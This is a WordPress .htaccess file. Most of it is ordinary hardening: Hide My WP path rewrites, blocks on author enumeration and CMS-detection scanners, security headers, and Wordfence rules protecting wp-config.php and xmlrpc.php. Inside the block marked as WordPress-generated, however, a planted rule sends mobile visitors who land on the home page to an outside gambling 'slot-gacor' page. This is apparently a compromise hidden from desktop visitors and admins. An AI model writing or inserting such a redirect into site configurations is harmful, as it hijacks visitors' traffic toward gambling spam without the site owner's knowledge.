# BEGIN HMWP_RULES
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule ^([0-9a-zA-Z_-]+/)?newlogin$ /wp-login.php [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?newlogin/(.*) /wp-login.php$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?lostpass$ /wp-login.php?action=lostpassword [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?register$ /wp-login.php?action=register [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/d0f4711431/(.*) /wp-content/plugins/hide-my-wp/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/ccc473c329/(.*) /wp-content/plugins/elementor-pro/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/f65f29574d/(.*) /wp-content/plugins/elementor/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/1a60a0f6ed/(.*) /wp-content/plugins/google-site-kit/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/7090cc99f5/(.*) /wp-content/plugins/google-website-translator/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/52cdd5ed69/(.*) /wp-content/plugins/independent-analytics/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/32a82a95e5/(.*) /wp-content/plugins/insert-headers-and-footers/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/7af5317b03/(.*) /wp-content/plugins/limit-login-attempts-reloaded/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/f9e2c7db84/(.*) /wp-content/plugins/really-simple-ssl/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/f913a6314f/(.*) /wp-content/plugins/sucuri-scanner/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/5f535e89d2/(.*) /wp-content/plugins/wordfence/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/f9c7f63a6a/(.*) /wp-content/plugins/wordpress-seo/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/cec2025f55/(.*) /wp-content/plugins/wp-smushit/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/1f02ccaf90/(.*) /wp-content/plugins/wpdiscuz/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/modules/(.*) /wp-content/plugins/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/views/7a3fccae50/design.css$ /wp-content/themes/hello-elementor/style.css [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/views/7a3fccae50/(.*) /wp-content/themes/hello-elementor/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/views/(.*) /wp-content/themes/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?storage/(.*) /wp-content/uploads/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?core/(.*) /wp-content/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?lib/(.*) /wp-includes/$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?comments/(.*) /wp-comments-post.php$2 [QSA,L]
RewriteRule ^([0-9a-zA-Z_-]+/)?writer/(.*) /author/$2 [QSA,L]
</IfModule>


# END HMWP_RULES

# BEGIN HMWP_VULNERABILITY
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_URI} !/wp-admin [NC]
RewriteCond %{QUERY_STRING} ^author=\d+ [NC]
RewriteRule ^(.*)$ - [L,R=404]
</IfModule>

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REMOTE_ADDR} ^35.214.130.87$ [NC,OR]
RewriteCond %{REMOTE_ADDR} ^192.185.4.40$ [NC,OR]
RewriteCond %{REMOTE_ADDR} ^15.235.50.223$ [NC,OR]
RewriteCond %{REMOTE_ADDR} ^172.105.48.130$ [NC,OR]
RewriteCond %{REMOTE_ADDR} ^167.99.233.123$ [NC,OR]
RewriteCond %{HTTP_USER_AGENT} (wpthemedetector|builtwith|isitwp|wapalyzer|mShots|WhatCMS|gochyu|wpdetector|scanwp) [NC]
RewriteRule ^(.*)$ - [L,R=404]
</IfModule>

<IfModule mod_headers.c>
Header always unset x-powered-by
Header always unset server
ServerSignature Off
</IfModule>

<IfModule mod_headers.c>
Header set Strict-Transport-Security "max-age=15768000;includeSubdomains"
Header set Content-Security-Policy "object-src 'none'"
Header set X-XSS-Protection "1; mode=block"
</IfModule>



# END HMWP_VULNERABILITY

# BEGIN WordPress
# Arahan (baris) antara "BEGIN WordPress" dan "END WordPress"
# dihasilkan secara dinamis, dan hanya dapat dimodifikasi melalui filter WordPress.
# Setiap perubahan pada arahan di antara penanda berikut akan ditimpa.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "android|blackberry|googlebot-mobile|iemobile|iphone|ipod|#opera mobile|palmos|webos" [NC]
RewriteRule ^$ https://amp.rajapoipet.org/slot-gacor.html [L,R=302]

# END WordPress

# Wordfence WAF
<IfModule LiteSpeed>
    php_value auto_prepend_file '/home/u8991790/public_html/nnyy/wordfence-waf.php'
</IfModule>
<IfModule lsapi_module>
    php_value auto_prepend_file '/home/u8991790/public_html/nnyy/wordfence-waf.php'
</IfModule>

# Protect .user.ini file
<Files ".user.ini">
    <IfModule mod_authz_core.c>
        Require all denied
    </IfModule>
    <IfModule !mod_authz_core.c>
        Order deny,allow
        Deny from all
    </IfModule>
</Files>

# Protect wp-config.php
<Files wp-config.php>
    <IfModule mod_authz_core.c>
        Require all denied
    </IfModule>
    <IfModule !mod_authz_core.c>
        Order deny,allow
        Deny from all
    </IfModule>
</Files>

# Block access to xmlrpc.php
<Files xmlrpc.php>
    <IfModule mod_authz_core.c>
        Require all denied
    </IfModule>
    <IfModule !mod_authz_core.c>
        Order deny,allow
        Deny from all
    </IfModule>
</Files>

# Redirect all HTTP requests to HTTPS
RewriteCond %{HTTPS} off
RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

# END Wordfence WAF
